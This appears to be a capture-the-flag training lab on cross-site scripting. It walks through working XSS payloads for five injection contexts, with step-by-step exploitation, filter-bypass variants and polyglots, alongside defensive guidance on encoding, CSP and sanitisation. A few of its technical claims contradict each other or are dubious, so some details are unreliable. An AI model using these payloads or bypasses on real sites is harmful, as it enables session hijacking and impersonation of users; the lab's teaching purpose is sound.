# Case Study: Lab 8 - Cross-Site Scripting (XSS) Vulnerabilities (CONTEXT-WISE)

## Business Context

**Company**: SocialFlow Media Platform  
**Role**: Frontend Security Tester  
**Date**: Q2 2024  
**Severity**: HIGH ⚠️

---

## Executive Summary

SocialFlow's platform has user-facing features across different components that don't properly sanitize input before rendering. The vulnerability manifests differently in 5 distinct contexts, and each context requires different exploitation techniques because of different parsing rules in HTML vs JavaScript vs URL contexts.

Your task is to **craft context-specific XSS payloads** against different input contexts and demonstrate their security impact.

---

# Lab 8.1 - HTML Content Context (Raw Body Injection)

## Context A: Unescaped HTML Content

### Problem Statement
Search results page renders user input directly in the HTML body tag as raw content. The application template contains:
```html
<h1>Search results for: <%= request.query.search %></h1>
```
Developers never implemented HTML escaping, assuming "search is just text". But HTML parsers are greedy - any `<` and `>` characters create new tags. Input like `<img src=x onerror="alert('xss')">` creates a real IMG tag with an onload event handler.

### Vulnerability Description
User input is inserted directly into HTML body context. Angle brackets `< >` are NOT escaped, so they create actual HTML elements. Event handlers (onerror, onload, etc.) execute automatically when parsed.

### Flag
```
FLAG!lab8_a_[hash]
```

---

## Context B: HTML Attribute Context with Quote Breakout

### Problem Statement
Image gallery allows users to supply alt text for their uploaded images. The template renders:
```html
<img src="image.jpg" alt="<%= user_input %>">
```
The developer escaped the quotes in the alt value (good!) but the input can still break out by including another quote and space, then injecting attributes. Input like `" onerror="fetch('/xss-success?variant=B').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))" x="` becomes:
```html
<img src="image.jpg" alt="" onerror="fetch('/xss-success?variant=B').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))" x="">
```
The first quote closes the alt attribute, then the new attribute executes.

### Vulnerability Description
Input is inside an HTML attribute. While quotes are often escaped, attribute context allows breaking out and injecting sibling attributes with event handlers.

### Flag
```
FLAG!lab8_b_[hash]
```

---

## Context C: JavaScript String Context with Escape Bypass

### Problem Statement
Comment section includes descriptions embedded in JavaScript:
```html
<script>
  var description = "<%= request.body.description %>";
</script>
```
JavaScript string escaping is different from HTML escaping. Even if the application escapes HTML entities (`&lt;`), JavaScript parsers will decode JavaScript escape sequences first. Input like `"; alert('xss'); //` breaks out of the string:
```javascript
var description = ""; alert('xss'); // ";
```
The quote ends the string, the alert executes, and the remaining quote is commented out.

### Vulnerability Description
Input is inside a JavaScript string literal. HTML entity escaping doesn't protect against JavaScript breakout. The string parser closes, then arbitrary JS executes, then the remaining content is commented.

### Flag
```
FLAG!lab8_c_[hash]
```

---

## Context D: DOM Tag/Element Injection

### Problem Statement
User profile page retrieves data from the server and uses jQuery to inject it into the DOM:
```javascript
$('#content').html(userInput);
```
The `.html()` method interprets angle brackets as HTML tags. Input like `<script>alert('xss')</script>` creates real script tags that execute. Unlike reflected XSS, the attacker controls the DOM element ID and can inject any HTML structure, including event handler tags.

### Vulnerability Description
Input is directly injected into the DOM via `.html()` method, which parses HTML. Script tags and event handler attributes execute as real code.

### Flag
```
FLAG!lab8_d_[hash]
```

---

## Context E: URL/Protocol Handler Context

### Problem Statement
Image source field allows URLs, and the template renders:
```html
<div style="background-image: url('<%= user_url %>');">
```
JavaScript protocol handlers (`javascript:`) execute code when triggered by browser navigation. Input like `javascript:alert('xss')` makes:
```html
<div style="background-image: url('javascript:alert('xss')');">
```
Some browsers execute the javascript: protocol when parsing CSS URLs. Additionally, the `src` attribute might render the URL as clickable or auto-fetched, triggering JavaScript execution.

### Vulnerability Description
URL context allows `javascript:` protocol. When browsers parse CSS or attribute URLs, protocol handlers like `javascript:` can trigger code execution without requiring user interaction in some cases.

### Flag
```
FLAG!lab8_e_[hash]
```

---

## Exploitation Techniques by Context

### Context A: HTML Content
**Payload**: `<script>alert('xss')</script>`
**Why it works**: Browser parses < as tag start, creates script element, code executes immediately
**Defense**: HTML entity encode: `&lt;img...`, or use innerText instead of innerHTML

### Context B: Attribute Breaking
**Payload**: `" onerror="alert('xss')" x="`
**Why it works**: Quote closes alt attribute, event handler injected as new attribute, onerror fires on invalid image
**Defense**: Quote escaping + input validation, or use setAttribute() instead of template strings

### Context C: JavaScript String
**Payload**: `"; alert('xss');//`
**Why it works**: Quote ends string, semicolon ends statement, new statement executes, // comments remainder
**Defense**: JavaScript escaping (not HTML), or use data instead of embedding in strings

### Context D: DOM Injection
**Payload**: `<img src=x onerror="alert('xss')">`
**Defense**: Use .text() instead of .html(), or sanitize with DOMPurify

### Context E: JavaScript Protocol
**Payload**: `javascript:alert('xss');void(0)`
**Why it works**: Browser interprets javascript: protocol, executes code, void(0) returns undefined (no navigation)
**Defense**: Whitelist protocols (http://, https://), reject javascript:

---

## Expected Discoveries

- **Context A requires**: Breaking HTML parser with angle brackets
- **Context B requires**: Escaping attribute quotes and injecting sibling attributes  
- **Context C requires**: Breaking JavaScript string literals
- **Context D requires**: Injecting HTML tags through DOM methods
- **Context E requires**: Using JavaScript protocol handler

---

**Document payloads for each context and explain why escaping/encoding differs.**

---

## Challenge A: HTML Content Injection (Search Box)

### Vulnerability Description
```html
<h1>Search results for: <%= search_query %></h1>
```

The search query is embedded directly in HTML without escaping.

### Attack Vector
**Simple payload:**
```html
<script>alert('XSS Works')</script>
```

**To trigger XSS:**
```html
<script>alert('xss')</script>
```

### Exploitation Steps:
1. Navigate to search functionality
2. Enter the payload in search box
3. Click "Search" or press Enter
4. Alert/flag appears

### Why It Works:
```html
Response HTML:
<h1>Search results for: <script>alert('XSS')</script></h1>
                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Browser treats this as executable script
```

### Your Objectives:
- [ ] Craft basic XSS payload
- [ ] Fetch flag from `/xss-success?variant=A`
- [ ] Extract flag from alert
- [ ] Submit flag to platform

---

## Challenge B: HTML Attribute Context (Image Alt Text)

### Vulnerability Description
```html
<img alt="<%= alt_text %>" src="image.jpg">
```

The alt text is embedded in an attribute without proper quoting.

### Attack Vector
**Break out of attribute context:**
```
" onerror="alert('xss')" x="
```

### Exploitation Steps:
1. Fill out image form (upload)
2. Alt text field: Paste the payload
3. Fill other required fields (title, category)
4. Click "Upload"
5. Image loads and error handler fires

### Why It Works:
```html
Response HTML:
<img alt="" onerror="fetch(...)" x="" src="image.jpg">
      ^    ^                      ^
      Close tag  Inject event    New attr
      
Browser:
1. Closes alt="" with closing quote
2. Adds onerror event handler
3. Non-existent/invalid image triggers onerror
4. Fetch executes, flag is retrieved
```

### Your Objectives:
- [ ] Identify image upload form
- [ ] Craft attribute-breaking payload
- [ ] Use event handler (onerror)
- [ ] Fetch and extract flag
- [ ] Submit flag

---

## Challenge C: JavaScript String Context (Description)

### Vulnerability Description
```html
<script>
  var projectDescription = "<%= description %>";
</script>
```

User input is embedded in a JavaScript string without escaping.

### Attack Vector
**Break out of string, execute code, comment out rest:**
```
test"; alert('xss');//
```

### Exploitation Steps:
1. Find the description/project creation form
2. Paste payload into description field
3. Fill other required fields (title, category)
4. Click "Publish" or "Create"
5. Page loads and JavaScript executes

### Why It Works:
```javascript
Original: var projectDescription = "<%= description %>";

After injection:
var projectDescription = "test"; 
fetch('/xss-success?variant=C').then(r=>r.json()).then(d=>alert('Flag: '+d.flag));//";

Parsing:
- "test" closes the string
- ; ends the statement
- fetch() is a NEW statement (our malicious code)
- // comments out the rest of the line
```

### Key Detail:
The detection pattern looks for `"; fetch` - there's a **space before fetch** to bypass simple string matching filters!

### Your Objectives:
- [ ] Identify JavaScript context input
- [ ] Break out of string context
- [ ] Execute fetch statement
- [ ] Use comments to hide the rest
- [ ] Extract and submit flag

---

## Challenge D: DOM Content (Post Content)

### Vulnerability Description
```html
<div class="post-content">
  <%= user_post %>
</div>
```

User post content is rendered directly as HTML.

### Attack Vector
**Image tag with error handler:**
```html
<img src=x onerror="alert('xss')">
```

### Exploitation Steps:
1. Navigate to "Post to Feed" feature
2. Enter the payload as post content
3. Click "Post to Feed"
4. Page reloads and shows your post
5. img tag error triggers handler
6. Flag is retrieved

### Why It Works:
```html
Response includes:
<div class="post-content">
  <img src=x onerror="...">
</div>

Browser:
1. Parses <img> tag
2. Tries to load src="x" (invalid)
3. Image fails to load
4. onerror event fires
5. Malicious JavaScript executes
```

### Your Objectives:
- [ ] Find post/feed creation feature
- [ ] Craft IMG tag with onerror
- [ ] Post/submit content
- [ ] Trigger error and execution
- [ ] Extract and submit flag

---

## Challenge E: URL/Protocol Handler (Source Field)

### Vulnerability Description
```html
<a href="<%= source_url %>">Open Resource</a>
```

A user-controlled URL is placed directly in an href attribute.

### Attack Vector
**JavaScript protocol:**
```javascript
javascript:alert('xss');void(0)
```

### Exploitation Steps:
1. Navigate to source/resource provisioning
2. Paste JavaScript protocol URL into "Source" field
3. Click "Provision" or "Create"
4. **THEN**: Scroll down and click the "Open" link
5. JavaScript protocol executes
6. Flag is retrieved

### Why It Works:
```html
HTML markup:
<a href="javascript:fetch(...);void(0)">Open</a>

Browser behavior:
When user clicks link with javascript: protocol:
1. Instead of loading URL
2. Execute the JavaScript code
3. void(0) returns undefined (no navigation)
4. Code executes in current context
```

### Important Notes:
- You MUST click the link to execute
- The `void(0)` prevents page navigation
- This is how many drive-by exploits work

### Your Objectives:
- [ ] Identify URL/source input field
- [ ] Create JavaScript protocol URL
- [ ] Submit/provision the resource
- [ ] Find and click the generated link
- [ ] JavaScript executes, flag retrieved
- [ ] Extract and submit flag

---

## XSS Payload Reference

### Context Detection

| Context | Example | Payload Type | Example Payload |
|---------|---------|--------------|-----------------|
| **HTML** | `<h1><%=input%></h1>` | Script tag | `<script>alert()</script>` |
| **Attr** | `<img alt="<%=input%>">` | Event handler | `" onload="..."` |
| **JS String** | `var x = "<%=input%>"` | Break string | `";alert();//` |
| **JS Code** | `var x=<%=input%>` | Template literal | ``${alert()}`` |
| **URL** | `<a href="<%=input%>">` | Protocol | `javascript:alert()` |

### Common XSS Payloads

**Basic Alert:**
```html
<script>alert('XSS')</script>
```

**Image with Event:**
```html
<img src=x onerror="alert('XSS')">
```

**Break Attribute:**
```html
" onload="alert('XSS')" x="
```

**String Context:**
```
";alert('XSS');//
```

**Protocol Handler:**
```
javascript:alert('XSS');void(0)
```

**Fetch Flag:**
```javascript
fetch('/xss-success?variant=X').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))
```

---

## Advanced Techniques

### Bypass Filters

**Filter: Blocks `<script>`**
```html
<img src=x onerror="alert()">
<svg onload="alert()">
<iframe srcdoc="<script>alert()</script>">
```

**Filter: Blocks `alert`**
```html
<script>fetch('/api/flag')</script>
<img src=x onerror="setTimeout(()=>alert(),0)">
```

**Filter: Blocks quotes**
```html
<img src=x onerror=alert(1)>
<svg onload='eval(atob("YWxlcnQoMSk="))'>
```

**Filter: Blocks event handlers**
```html
<iframe src="javascript:alert()">
<object data="javascript:alert()">
```

### Polymorph Payloads

**Works in multiple contexts:**
```
';/**/alert(1)//
"><script>alert(1)</script>
';/**/alert(1);/*
```

---

## Tools for XSS Testing

### Manual Testing
```
1. Test each input field
2. Try different payload types
3. Check browser console for errors
4. Inspect network requsts
```

### Browser Console
```javascript
// Check if XSS worked
console.log('XSS Executed!');

// Fetch flag
fetch('/xss-success?variant=A')
  .then(r=>r.json())
  .then(d=>console.log('Flag: '+d.flag))
```

### Burp Suite
- **Repeater**: Test payloads manually
- **Intruder**: Fuzz input fields
- **Decoder**: HTML/URL encode/decode

### OWASP ZAP
- Automated XSS scanner
- Payload delivery
- Result analysis

---

## What You Should Discover

### Lab 8.1 Expected Findings:

```json
{
  "Context_A_HTML": {
    "vulnerability": "Unescaped HTML content",
    "payload": "<script>alert('xss')</script>",
    "entry_point": "Search box",
    "flag": "FLAG!lab8_1a_[hash]"
  },
  "Context_B_Attribute": {
    "vulnerability": "Unquoted/improperly quoted attribute",
    "payload": "\" onerror=\"alert('xss')\" x=\"",
    "entry_point": "Image alt text",
    "flag": "FLAG!lab8_1b_[hash]"
  },
  "Context_C_JavaScript": {
    "vulnerability": "Unescaped string in JavaScript",
    "payload": "test\"; alert('xss');//",
    "entry_point": "Description field",
    "execution_context": "Script tag content",
    "flag": "FLAG!lab8_1c_[hash]"
  },
  "Context_D_DOM": {
    "vulnerability": "User content rendered as HTML",
    "payload": "<img src=x onerror=\"alert('xss')\">",
    "entry_point": "Post content",
    "flag": "FLAG!lab8_1d_[hash]"
  },
  "Context_E_URL": {
    "vulnerability": "JavaScript protocol in href",
    "payload": "javascript:alert('xss');void(0)",
    "entry_point": "Source URL",
    "trigger": "Must click link",
    "flag": "FLAG!lab8_1e_[hash]"
  }
}
```

---

## Technical Concepts

### XSS Attack Chain

```
Attacker Input
    ↓
Server receives unescaped
    ↓
Stored in database
    ↓
Served to victim's browser
    ↓
Browser parses HTML/JavaScript
    ↓
Malicious code executes
    ↓
Attacker gains access to:
- Session cookies
- Sensitive data
- User credentials
- Can perform actions as victim
```

### Context-Aware Escaping

```
Context     Escape Method          Example
============================================
HTML        Entity encoding        <div>&lt;script&gt;
Attribute   Quote + Entity         alt="&quot;onload&quot;"
URL         URL encoding            href="javascript%3Aalert()"
JavaScript  Unicode escape         var x = "\u0074est"
CSS         Font-face mitigation   
```

### Same Origin Policy & XSS

- XSS exploits SOP by executing in victim's **origin**
- Attacker can read cookies, localStorage, session data
- Make requests as the victim
- Access data intended for that user

---

## Real-World XSS Impact

**Attacks enabled by XSS:**
- **Session hijacking**: Steal authentication cookies
- **Credential theft**: Log user keystrokes, phish
- **Data exfiltration**: Extract sensitive information
- **Malware distribution**: Inject drive-by downloads
- **Defacement**: Modify page content
- **User impersonation**: Post/comment/purchase as victim
- **Botneting**: Enlist browsers in attacks

**Real breaches (XSS vector):**
- eBay: Stored XSS in auction pages
- Facebook: DOM-based XSS in video player
- Twitter: Stored XSS in DMs
- MySpace: Malicious JavaScript injection

---

## Defense Strategies (Learn These!)

### ✅ Output Encoding
```python
# HTML entity encoding
from markupsafe import escape
safe_html = escape(user_input)
# Result: <script> → &lt;script&gt;
```

### ✅ Content Security Policy (CSP)
```html
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'; style-src 'self'">
```

### ✅ Template Auto-Escaping
```python
# Django/Jinja2 default HTML escaping
{{ user_input }}  <!-- Auto-escaped -->
{{ user_input|safe }}  <!-- Only when safe -->
```

### ✅ DOM API (safe methods)
```javascript
// UNSAFE - Allows HTML injection
element.innerHTML = userInput;

// SAFE - Renders as text
element.textContent = userInput;
element.innerText = userInput;

// SAFE - Explicitly creates text node
element.appendChild(document.createTextNode(userInput));
```

### ✅ Validation Rules
```python
# Whitelist allowed tags
allowed_tags = ['b', 'i', 'strong', 'em']
# Reject everything else
sanitized = bleach.clean(input, allowed_tags)
```

---

## Prevention Checklist

- [ ] Encode ALL user output based on context
- [ ] Never trust user input for HTML/JavaScript
- [ ] Implement Content Security Policy
- [ ] Use templating engines with auto-encoding
- [ ] Validate input + encode output
- [ ] Use security libraries (DOMPurify, Bleach)
- [ ] Test for XSS in development
- [ ] Monitor for malicious activity
- [ ] Keep frameworks updated

---

## Key Takeaways

1. **Context matters** - Different contexts need different escaping
2. **Never trust user input** - Assume it will be malicious
3. **Encode output, not input** - Validation is not escaping
4. **Defense in depth** - CSP + escaping + validation
5. **XSS is often underestimated** - It's a critical vulnerability
6. **Different attack vectors** - Reflected vs Stored vs DOM
7. **Modern frameworks help** - React, Vue auto-encode by default

---

## Related Concepts

- **CWE-79**: Improper Neutralization (XSS)
- **CWE-94**: Improper Control of Generation of Code (Code Injection)
- **OWASP A03:2021**: Injection (includes XSS)
- **DOM XSS**: JavaScript-based injection
- **CSRF**: Often paired with XSS for account takeover

---

## Flag Submission Checklist

For each context (A-E):
- [ ] Identified vulnerable input field
- [ ] Crafted context-appropriate payload
- [ ] Executed payload successfully
- [ ] Fetched flag from endpoint
- [ ] Extracted flag from response
- [ ] Submitted flag to platform

---

**Document each payload, its context, and exploitation technique. Security review requires detailed methodology.**
